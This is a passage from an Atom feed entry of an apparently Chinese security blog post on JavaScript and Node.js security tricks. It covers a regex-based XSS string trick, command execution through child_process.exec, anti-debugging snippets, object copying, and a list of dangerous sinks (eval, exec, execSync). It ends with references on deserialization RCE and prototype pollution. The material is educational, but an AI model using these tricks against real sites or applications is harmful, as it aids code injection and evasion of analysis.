string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;RegExp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;toString&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;xss &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// =&gt; /xss/a&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
+&lt;h2 id=&#34;命令执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行&#34;&gt;#&lt;/a&gt; 命令执行&lt;/h2&gt;
+&lt;p&gt;Node.js 中 child_process.exec 命令调用的是  &lt;code&gt;/bin/sh&lt;/code&gt;  ，故可以直接使用该命令执行 shell&lt;/p&gt;
+&lt;h2 id=&#34;反调试技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反调试技巧&#34;&gt;#&lt;/a&gt; 反调试技巧&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;函数重定义  &lt;code&gt;console.log = function(a)&amp;#123;&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;定时断点  &lt;code&gt;setInterval(function()&amp;#123;debugger&amp;#125;, 1000);&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;对象拷贝&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#对象拷贝&#34;&gt;#&lt;/a&gt; 对象拷贝&lt;/h2&gt;
+&lt;p&gt;JavaScript 中的对象拷贝分为浅拷贝和深拷贝。&lt;/p&gt;
+&lt;p&gt;浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。&lt;/p&gt;
+&lt;p&gt;深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。&lt;/p&gt;
+&lt;p&gt;深拷贝可以基于  &lt;code&gt;for-in&lt;/code&gt;  /  &lt;code&gt;object.assign()&lt;/code&gt;  / 拓展运算符  &lt;code&gt;...&lt;/code&gt;  /  &lt;code&gt;JSON.parse(JSON.stringify())&lt;/code&gt;  等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。&lt;/p&gt;
+&lt;h2 id=&#34;常见sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见sink&#34;&gt;#&lt;/a&gt; 常见 Sink&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;child_process&lt;/li&gt;
+&lt;li&gt;eval&lt;/li&gt;
+&lt;li&gt;exec&lt;/li&gt;
+&lt;li&gt;execSync&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy9zeXN0ZW0vMTYzNTc5Lmh0bWw=&#34;&gt;JavaScript 反调试技巧&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL2VjbWEtMjYyLzUuMS8jc2VjLTE1LjMuNC41&#34;&gt;ECMAScript Language Specification&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTgzNzQ2P3NvcnQ9Y3JlYXRlZA==&#34;&gt;js prototype&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Njc2Ntcy9ndWFyZEpzLw==&#34;&gt;javascript 防劫持&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ZleC5iYWlkdS5jb20vYmxvZy8yMDE0LzA2L3hzcy1mcm9udGVuZC1maXJld2FsbC0zLmh0bWw=&#34;&gt;XSS 前端防火墙&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v&#34;&gt;exploiting node js deserialization bug for remote code execution&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVSL3Byb3RvdHlwZS1wb2xsdXRpb24tbnNlYzE4Lw==&#34;&gt;Prototype pollution attack&lt;/span&gt; Content released at NorthSec 2018 on prototype pollution&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="语言" />
+        <category term="反序列化" />
+        <category term="沙箱" />
+        <category term="JavaScript" />
+        <updated>2022-11-28T01:50:11.000Z</updated>
+    </entry>
+</feed>
